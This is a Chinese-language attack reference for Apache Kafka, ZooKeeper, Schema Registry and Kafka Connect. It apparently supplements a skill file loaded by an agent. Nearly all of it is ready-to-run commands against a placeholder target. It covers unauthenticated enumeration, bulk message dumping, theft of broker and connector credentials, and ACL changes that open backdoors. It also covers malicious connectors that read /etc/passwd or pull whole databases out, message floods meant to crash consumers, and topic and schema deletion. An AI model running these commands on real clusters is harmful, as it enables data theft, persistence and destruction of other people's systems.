# Kafka 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 未授权枚举

### 利用条件
- Kafka Broker 监听 9092 且未配置 SASL 认证
- 网络可达目标端口

### Broker 版本探测

```bash
# 获取 Broker 支持的 API 版本（版本指纹）
kafka-broker-api-versions.sh --bootstrap-server TARGET:9092

# kcat 元数据查询
kcat -b TARGET:9092 -L
# 输出 Broker 列表、Topic 列表、分区分布
```

### Topic 枚举

```bash
# 列出全部 Topic
kafka-topics.sh --list --bootstrap-server TARGET:9092

# Topic 详细描述（分区数、副本因子、ISR 列表）
kafka-topics.sh --describe --bootstrap-server TARGET:9092

# 单 Topic 详情
kafka-topics.sh --describe --bootstrap-server TARGET:9092 --topic TOPIC_NAME

# Topic 配置查看
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type topics --entity-name TOPIC_NAME --describe

# 搜索敏感 Topic
kafka-topics.sh --list --bootstrap-server TARGET:9092 | \
  grep -iE "password|secret|credential|auth|token|sensitive|payment|order|user"
```

**攻击效果**: 获取集群拓扑、Topic 列表、数据分布信息，为后续消息窃取提供目标。

---

## 2. 消息批量导出

### 利用条件
- Broker 无认证或已获取有效凭据
- 对目标 Topic 有 READ 权限（无 ACL 时默认允许）

### 单 Topic 导出

```bash
# 从头消费（限制条数）
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --from-beginning \
  --max-messages 10000 > /tmp/topic_dump.txt

# 监听实时消息
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME

# 从特定 Offset 开始消费
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --partition 0 \
  --offset 100 \
  --max-messages 500

# 带时间戳输出
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --from-beginning \
  --max-messages 100 \
  --property print.timestamp=true \
  --property print.key=true
```

### 批量导出所有 Topic

```bash
# 遍历全部 Topic 并导出
for topic in $(kafka-topics.sh --list --bootstrap-server TARGET:9092); do
  echo "=== Exporting: $topic ==="
  kafka-console-consumer.sh \
    --bootstrap-server TARGET:9092 \
    --topic "$topic" \
    --from-beginning \
    --max-messages 10000 > "/tmp/kafka_${topic}.txt" 2>/dev/null
done

# 仅导出匹配关键词的 Topic
for topic in $(kafka-topics.sh --list --bootstrap-server TARGET:9092 | \
  grep -iE "password|secret|credential|auth|token|user|order|payment"); do
  echo "=== Sensitive Topic: $topic ==="
  kafka-console-consumer.sh \
    --bootstrap-server TARGET:9092 \
    --topic "$topic" \
    --from-beginning \
    --max-messages 5000 > "/tmp/kafka_sensitive_${topic}.txt"
done
```

### kcat 替代方案

```bash
# kcat 消费（更轻量，无需 Kafka 安装包）
kcat -b TARGET:9092 -t TOPIC_NAME -C -e -o beginning > /tmp/kcat_dump.txt

# kcat 带元数据输出
kcat -b TARGET:9092 -t TOPIC_NAME -C -e -f '%T %k %s\n' -o beginning

# kcat 导出为 JSON
kcat -b TARGET:9092 -t TOPIC_NAME -C -e -J -o beginning > /tmp/kcat_dump.json
```

**攻击效果**: 获取 Topic 中全部或部分历史消息，可能包含业务数据、用户信息、凭据等敏感内容。

---

## 3. Consumer Group 操作

### 利用条件
- Broker 无认证或已获取有效凭据
- 对 Consumer Group 有管理权限（无 ACL 时默认允许）

### 枚举

```bash
# 列出全部 Consumer Group
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 --list

# 查看 Group 详情（当前 offset、log-end-offset、lag）
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME --describe

# 查看 Group 成员信息
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME --describe --members

# 查看 Group 状态
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME --describe --state
```

### Offset 重置（消息重放）

```bash
# 重置到最早（重新消费全部消息）
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME \
  --reset-offsets --to-earliest \
  --execute

# 重置到最新（跳过全部历史消息）
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME \
  --reset-offsets --to-latest \
  --execute

# 重置到指定 Offset
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME:0 \
  --reset-offsets --to-offset 100 \
  --execute

# 按时间重置
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME \
  --reset-offsets --to-datetime "2024-01-01T00:00:00.000" \
  --execute

# 重置所有 Topic 的 Offset
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --all-topics \
  --reset-offsets --to-earliest \
  --execute
```

**关键判断**: Offset 重置会导致业务 Consumer 重复消费或跳过消息。`--to-earliest` 可配合自己的 Consumer 重新拉取全部历史数据。

---

## 4. Broker 配置窃取

### 利用条件
- Broker 无认证或已获取有效凭据
- DescribeConfigs API 可用

### 通过 Kafka CLI

```bash
# 获取 Broker 全部配置
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type brokers --entity-name 0 --describe --all

# 获取全部 Broker 配置（不指定 ID）
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type brokers --describe

# 搜索敏感配置项
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type brokers --entity-name 0 --describe --all 2>&1 | \
  grep -iE "password|secret|ssl|sasl|credential|jaas|keystore|truststore"

# Topic 级别配置
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type topics --entity-name TOPIC_NAME --describe --all
```

### 通过 ZooKeeper 读取

```bash
# 如果 ZooKeeper 未授权，可直接读取 Broker 配置
zkCli.sh -server TARGET:2181 <<EOF
get /config/brokers/0
get /brokers/ids/0
ls /config/topics
EOF

# 获取动态配置覆盖（可能含 JAAS 配置等敏感信息）
zkCli.sh -server TARGET:2181 <<EOF
get /config/brokers/0
get /config/brokers/1
EOF
```

### Broker Metrics（JMX）

```bash
# 如果 JMX 端口暴露（通常 9999 或自定义）
# 可通过 jmxterm 或 Metasploit 读取
# JMX 中可能包含配置、连接字符串等
nmap -sV -p 9999 TARGET
```

**攻击效果**: 获取 Broker 认证配置（SASL/JAAS）、SSL 证书路径、集群间通信凭据，可用于横向移动。

---

## 5. ACL 操控

### 利用条件
- Broker 无认证或已获取有效凭据
- `authorizer.class.name` 已配置但无 ACL 限制管理操作
- 或 Broker 未启用 Authorizer（默认无 ACL）

### ACL 枚举

```bash
# 列出全部 ACL
kafka-acls.sh --bootstrap-server TARGET:9092 --list

# 查看特定 Topic 的 ACL
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME --list

# 查看特定用户的 ACL
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --principal User:username --list

# 查看 Consumer Group ACL
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME --list
```

### ACL 篡改

```bash
# 添加 ACL：允许所有用户对指定 Topic 执行全部操作
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --add --allow-principal User:* \
  --operation All --topic TOPIC_NAME

# 添加 ACL：允许匿名用户读写
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --add --allow-principal User:ANONYMOUS \
  --operation Read --operation Write \
  --topic TOPIC_NAME

# 添加 ACL：允许所有用户管理 Consumer Group
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --add --allow-principal User:* \
  --operation All --group "*"

# 删除 ACL（移除访问控制）
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --remove --topic TOPIC_NAME --force

# 添加集群级别 ACL（最高权限）
kafka-acls.sh --bootstrap-server TARGET:9092 \
  --add --allow-principal User:* \
  --operation All --cluster
```

**攻击效果**: 篡改 ACL 可提升自身权限、为后续访问建立持久化后门、或移除其他用户权限造成拒绝服务。

---

## 6. Schema Registry 利用

### 利用条件
- Schema Registry 暴露在 8081 端口且无认证
- 使用 Confluent Platform 或兼容的 Schema Registry

### 枚举

```bash
# 获取所有 Subject（对应 Topic 的 Schema）
curl -s http://TARGET:8081/subjects | jq .

# 获取 Subject 版本列表
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions | jq .

# 获取最新 Schema
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions/latest | jq .

# 获取指定版本 Schema
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions/1 | jq .

# 按 ID 获取 Schema
curl -s http://TARGET:8081/schemas/ids/1 | jq .

# 获取全局兼容性配置
curl -s http://TARGET:8081/config | jq .
```

### 敏感字段搜索

```bash
# 遍历所有 Subject 搜索敏感字段定义
for subject in $(curl -s http://TARGET:8081/subjects | jq -r '.[]'); do
  echo "=== $subject ==="
  curl -s "http://TARGET:8081/subjects/$subject/versions/latest" | \
    jq -r '.schema' | grep -iE "password|secret|token|ssn|credit_card|phone|email|address"
done
```

### Schema 篡改（破坏性）

```bash
# 修改兼容性配置为 NONE（允许任意 Schema 变更）
curl -X PUT http://TARGET:8081/config \
  -H "Content-Type: application/vnd.schemaregistry.v1+json" \
  -d '{"compatibility": "NONE"}'

# 注册新版本 Schema（可能导致消费端反序列化失败）
curl -X POST http://TARGET:8081/subjects/TOPIC_NAME-value/versions \
  -H "Content-Type: application/vnd.schemaregistry.v1+json" \
  -d '{"schema": "{\"type\": \"string\"}"}'

# 删除 Subject（破坏性）
curl -X DELETE http://TARGET:8081/subjects/TOPIC_NAME-value
```

**攻击效果**: 获取数据结构定义（了解业务数据格式），篡改 Schema 可导致消费端崩溃。

---

## 7. Kafka Connect 利用

### 利用条件
- Kafka Connect REST API 暴露在 8083 端口且无认证
- 使用 Distributed 模式（REST API 默认开启）

### 枚举

```bash
# 获取 Connect 集群信息
curl -s http://TARGET:8083/ | jq .

# 列出已安装的 Connector 插件
curl -s http://TARGET:8083/connector-plugins | jq .

# 列出所有 Connector
curl -s http://TARGET:8083/connectors | jq .

# 获取 Connector 配置
curl -s http://TARGET:8083/connectors/CONNECTOR_NAME/config | jq .

# 获取 Connector 状态
curl -s http://TARGET:8083/connectors/CONNECTOR_NAME/status | jq .
```

### 凭据窃取

```bash
# 批量提取所有 Connector 中的敏感配置
for conn in $(curl -s http://TARGET:8083/connectors | jq -r '.[]'); do
  echo "=== Connector: $conn ==="
  curl -s "http://TARGET:8083/connectors/$conn/config" | \
    jq 'to_entries[] | select(.key | test("password|secret|token|credential|connection.url|connection.user|jdbc.url"; "i"))'
done

# 常见敏感字段:
# connection.url — 数据库连接字符串
# connection.user / connection.password — 数据库凭据
# aws.access.key.id / aws.secret.access.key — AWS 凭据
# consumer.override.sasl.jaas.config — Kafka SASL 凭据
```

### 恶意 Connector 注入

```bash
# FileStreamSinkConnector: 将 Topic 数据写入目标文件系统
curl -X POST http://TARGET:8083/connectors \
  -H "Content-Type: application/json" -d '{
    "name": "exfil-sink",
    "config": {
      "connector.class": "FileStreamSinkConnector",
      "tasks.max": "1",
      "file": "/tmp/exfiltrated-data.txt",
      "topics": "sensitive-topic"
    }
  }'

# FileStreamSourceConnector: 读取目标文件系统文件到 Topic
curl -X POST http://TARGET:8083/connectors \
  -H "Content-Type: application/json" -d '{
    "name": "read-file",
    "config": {
      "connector.class": "FileStreamSourceConnector",
      "tasks.max": "1",
      "file": "/etc/passwd",
      "topic": "exfil-topic"
    }
  }'

# JDBC Source Connector: 连接外部数据库导出数据
curl -X POST http://TARGET:8083/connectors \
  -H "Content-Type: application/json" -d '{
    "name": "jdbc-exfil",
    "config": {
      "connector.class": "io.confluent.connect.jdbc.JdbcSourceConnector",
      "connection.url": "jdbc:mysql://DB_HOST:3306/dbname",
      "connection.user": "STOLEN_USER",
      "connection.password": "STOLEN_PASS",
      "table.whitelist": "users",
      "mode": "bulk",
      "topic.prefix": "exfil-"
    }
  }'
```

### Connector 管理

```bash
# 暂停 Connector
curl -X PUT http://TARGET:8083/connectors/CONNECTOR_NAME/pause

# 恢复 Connector
curl -X PUT http://TARGET:8083/connectors/CONNECTOR_NAME/resume

# 删除 Connector（清理痕迹）
curl -X DELETE http://TARGET:8083/connectors/exfil-sink

# 重启 Connector
curl -X POST http://TARGET:8083/connectors/CONNECTOR_NAME/restart
```

**攻击效果**: 窃取数据库凭据、AWS 密钥等；注入恶意 Connector 可实现文件读取、数据外泄、甚至利用 JDBC Connector 访问内网数据库。

---

## 8. 消息注入与篡改

### 利用条件
- Broker 无认证或已获取有效凭据
- 对目标 Topic 有 WRITE 权限（无 ACL 时默认允许）

### 消息注入

```bash
# 向 Topic 注入消息
echo "injected_message_payload" | kafka-console-producer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME

# 带 Key 的消息注入
echo "malicious_key:malicious_value" | kafka-console-producer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --property "parse.key=true" \
  --property "key.separator=:"

# 从文件批量注入
kafka-console-producer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME < /tmp/malicious-messages.txt

# kcat 注入
echo "payload" | kcat -b TARGET:9092 -t TOPIC_NAME -P
```

### 格式破坏（反序列化攻击）

```bash
# 注入无效格式数据（如果消费端期望 JSON）
echo "this_is_not_json" | kafka-console-producer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME

# 注入超大消息（可能触发 OOM 或消费端异常）
head -c 10000000 /dev/urandom | base64 | kafka-console-producer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME

# 批量注入垃圾数据
for i in $(seq 1 1000); do
  echo "spam_message_$i" | kafka-console-producer.sh \
    --bootstrap-server TARGET:9092 \
    --topic TOPIC_NAME
done
```

### Topic 删除（破坏性）

```bash
# 删除 Topic
kafka-topics.sh --bootstrap-server TARGET:9092 \
  --delete --topic TOPIC_NAME

# 修改 Topic 配置（缩短数据保留时间导致数据丢失）
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type topics --entity-name TOPIC_NAME \
  --alter --add-config retention.ms=1000
```

**攻击效果**: 注入恶意数据可影响下游业务逻辑；格式破坏可导致消费端崩溃；Topic 删除直接造成数据丢失。

---

## 9. ZooKeeper 利用

### 利用条件
- ZooKeeper 监听 2181 且无认证（未配置 SASL/Kerberos）
- 网络可达 ZooKeeper 端口

### 四字命令探测

```bash
# 测试连通性
echo ruok | nc TARGET 2181
# 返回 imok

# 获取环境信息
echo envi | nc TARGET 2181

# 获取统计信息
echo stat | nc TARGET 2181

# 获取连接信息
echo cons | nc TARGET 2181

# dump 全部 session 与临时节点
echo dump | nc TARGET 2181

# 服务器配置
echo conf | nc TARGET 2181
```

### zkCli.sh 枚举

```bash
# 连接 ZooKeeper
zkCli.sh -server TARGET:2181

# === 在 zkCli.sh 交互式 Shell 中 ===

# 列出根节点
ls /

# Kafka Broker 列表
ls /brokers/ids
get /brokers/ids/0
get /brokers/ids/1

# Topic 列表与元数据
ls /brokers/topics
get /brokers/topics/TOPIC_NAME

# Broker 动态配置（可能含敏感信息）
ls /config/brokers
get /config/brokers/0

# Topic 配置
ls /config/topics
get /config/topics/TOPIC_NAME

# Consumer Offsets（老版本）
ls /consumers

# Controller 信息
get /controller

# ACL 信息
ls /kafka-acl
ls /kafka-acl/Topic
get /kafka-acl/Topic/TOPIC_NAME
```

### ZooKeeper 数据篡改（破坏性）

```bash
# 修改 Topic 配置
zkCli.sh -server TARGET:2181 <<EOF
set /config/topics/TOPIC_NAME {"version":1,"config":{"retention.ms":"1000"}}
EOF

# 删除 Topic 节点（可能导致 Broker 异常）
zkCli.sh -server TARGET:2181 <<EOF
rmr /brokers/topics/TOPIC_NAME
EOF
```

**攻击效果**: 获取完整集群拓扑、Broker 配置、ACL 规则；篡改 ZooKeeper 数据可导致集群不稳定或配置变更。

---

## 工具清单

| 工具 | 地址 | 用途 |
|------|------|------|
| kafka-*-sh 系列 | Apache Kafka 自带 | Broker/Topic/Consumer/ACL 管理 |
| kcat (kafkacat) | https://github.com/edenhill/kcat | 轻量级 Kafka 客户端 |
| zkCli.sh | Apache ZooKeeper 自带 | ZooKeeper 交互式管理 |
| curl + jq | 系统工具 | Schema Registry / Kafka Connect REST API |
| nmap | https://nmap.org | 端口发现与服务识别 |
